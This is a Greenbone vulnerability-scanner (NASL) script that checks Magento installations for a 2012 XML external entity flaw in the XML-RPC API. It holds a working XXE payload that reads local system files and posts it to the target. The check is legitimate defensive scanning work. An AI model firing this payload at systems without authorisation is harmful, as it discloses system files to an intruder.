# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:magentocommerce:magento";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103518");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_name("Magento eCommerce Local File Disclosure Vulnerability (Jul 2012)");

  script_xref(name:"URL", value:"http://bot24.blogspot.de/2012/07/sec-consult-sa-20120712-0-magento.html");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/blog/comments/update-zend-framework-vulnerability-security-update/");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.0.0-1.4.1.1.patch");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.4.2.0.patch");
  script_xref(name:"URL", value:"http://www.magentocommerce.com/downloads/assets/1.7.0.2/CE_1.5.0.0-1.7.0.1.patch");

  script_tag(name:"summary", value:"Magento eCommerce is prone to a local file disclosure
  vulnerability.");

  script_tag(name:"insight", value:"Magento eCommerce platform uses a vulnerable version of Zend
  framework which is prone to XML eXternal Entity Injection attacks. The SimpleXMLElement class of
  Zend framework (SimpleXML PHP extension) is used in an insecure way to parse XML data. External
  entities can be specified by adding a specific DOCTYPE element to XML-RPC requests. By exploiting
  this vulnerability an application may be coerced to open arbitrary files and/or TCP
  connections.");

  script_tag(name:"solution", value:"Updates are available. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2012-07-16 10:24:55 +0200 (Mon, 16 Jul 2012)");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_dependencies("sw_magento_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("magento/http/detected");

  script_tag(name:"qod_type", value:"remote_active");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("host_details.inc");
include("os_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

host = http_host_name( port:port );

files = traversal_files();

url = dir + "/api/xmlrpc";

foreach file (keys(files)) {

 ex = '<?xml version="1.0"?>
   <!DOCTYPE foo [
   <!ELEMENT methodName ANY >
   <!ENTITY xxe SYSTEM "file:///' + files[file]  + '" >]>
  <methodCall>
    <methodName>&xxe;</methodName>
  </methodCall>';

  len = strlen(ex);

  req = string("POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Content-Length: ", strlen(ex),
               "\r\n\r\n",
               ex);

  result = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

  if(egrep(pattern:file, string:result)) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
